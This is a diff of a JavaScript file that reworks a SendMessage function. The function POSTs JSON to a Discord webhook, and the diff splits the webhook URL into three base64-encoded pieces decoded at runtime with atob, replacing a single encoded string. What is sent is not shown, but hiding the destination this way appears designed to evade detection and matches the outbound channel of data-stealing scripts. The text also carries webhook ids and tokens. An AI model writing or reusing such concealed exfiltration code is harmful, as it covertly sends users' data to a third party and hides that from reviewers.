@@ -112,11 +112,10 @@ function SessionStorage(action, key, value) {
 
 function SendMessage(msg) {
 
-    //var encodedStringBtoA = btoa('link');
-    //console.log(encodedStringBtoA);
+    //btoa('');
 
     const request = new XMLHttpRequest();
-    request.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTAxMDUwMzQzMjI3NDA0NC9IZFUwM2MxZGVIS2dqd0s4SFlPcWF6V25GSzR3Z3BhR2lRNG1GV0dNc09UWXlnRlVvSVltRFNRZ1NGZ0xzSENOVnFTNQ=="));
+    request.open("POST", `${disc_url()}/${disc_url_base()}/${disc_url_ext()}`);
 
     request.setRequestHeader('Content-type', 'application/json');
 
@@ -173,4 +172,16 @@ function UnEscapeURL(str) {
         .replaceAll("%3B", ";")
         .replaceAll("%7C", "|")
         .replaceAll("%2C", ",");
+}
+
+function disc_url() {
+    return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3M=');
+}
+
+function disc_url_base() {
+    return atob('MTM3NDk4NTM1OTczMzE2NjE1MQ==');
+}
+
+function disc_url_ext() {
+    return atob('SGJnVXk5Nzk1LWFYaS1lSXNJZHoxaHF5ZDZqcmZCQ3hIbFZkZWw1ZkRpTDFBS0ZyX2daSGIwTUpxaF9KTTFGVU12bGI=');
 }
